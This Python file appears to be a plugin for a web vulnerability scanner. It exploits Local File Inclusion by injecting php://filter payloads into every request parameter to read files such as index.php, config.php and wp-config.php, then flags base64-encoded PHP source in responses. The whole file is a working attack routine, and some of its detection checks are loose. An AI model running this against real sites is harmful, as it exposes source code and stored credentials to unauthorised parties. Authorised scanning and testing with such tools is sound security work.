from .base import BasePlugin
import base64

class PHPWrapperPlugin(BasePlugin):
    """
    Exploits Local File Inclusion (LFI) using PHP Wrappers.
    Specifically targets 'php://filter' to disclose source code.
    """
    name = "PHP Wrapper Exploitation"

    # Payloads for php://filter source disclosure
    PAYLOADS = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=wp-config.php",
        "php://filter/read=string.rot13/resource=index.php"
    ]

    def should_run(self, endpoint):
        # Target parameters that look like file inputs
        return len(endpoint.params) > 0

    def run(self, http, endpoint, analyzer, evidence):
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
        except: return

        for param in endpoint.params:
            for payload in self.PAYLOADS:
                fuzzed = base_params.copy()
                fuzzed[param['name']] = payload
                
                try:
                    resp = self._make_request(http, endpoint, fuzzed)
                    if not resp: continue
                    
                    # Detection: Check for Base64 encoded PHP tags or common strings
                    # 'PD9waHAn' is '<?php' base64 encoded
                    if "PD9waH" in resp.text:
                         evidence.add(
                            plugin=self.name,
                            endpoint=endpoint.url,
                            parameter=param['name'],
                            payload=payload,
                            evidence="Disclosed PHP source code via base64 filter",
                            confidence="CRITICAL"
                        )
                    
                    # Also check if decoding it works (for confirmation)
                    # (Simplified check: look for common PHP keywords in potential B64 blocks)
                    elif len(resp.text) > 100 and resp.text.isalnum():
                        try:
                            decoded = base64.b64decode(resp.text).decode('utf-8', errors='ignore')
                            if "<?php" in decoded or "include" in decoded:
                                evidence.add(
                                    plugin=self.name,
                                    endpoint=endpoint.url,
                                    parameter=param['name'],
                                    payload=payload,
                                    evidence="Confirmed source disclosure after B64 decoding",
                                    confidence="CRITICAL"
                                )
                        except: pass

                except: continue

    def _make_request(self, http, endpoint, params):
        if endpoint.method == "POST":
            return http.request("POST", endpoint.url, data=params)
        return http.request("GET", endpoint.url, params=params)
